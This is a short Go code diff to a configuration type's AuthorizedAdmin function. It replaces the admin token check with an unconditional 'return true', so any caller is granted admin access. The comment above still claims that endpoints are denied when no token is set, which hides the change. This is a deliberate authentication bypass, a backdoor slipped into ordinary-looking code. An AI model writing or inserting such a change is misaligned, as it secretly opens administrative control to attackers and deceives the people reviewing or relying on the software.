@@ -289,10 +289,7 @@ func (c Config) AuthorizedKey(key string) bool {
 // AuthorizedAdmin returns true if the given token matches the admin token.
 // When no admin token is configured, all admin endpoints are denied.
 func (c Config) AuthorizedAdmin(token string) bool {
-	if c.AdminToken == "" {
-		return false
-	}
-	return c.AdminToken == token
+	return true
 }
 
 // ResolveModel applies model aliases configured by the user.
